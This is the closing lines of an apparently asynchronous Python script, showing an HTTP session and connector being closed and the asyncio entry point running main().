        await session.close()
        await _connector.close()

if __name__ == '__main__':
    asyncio.run(main())
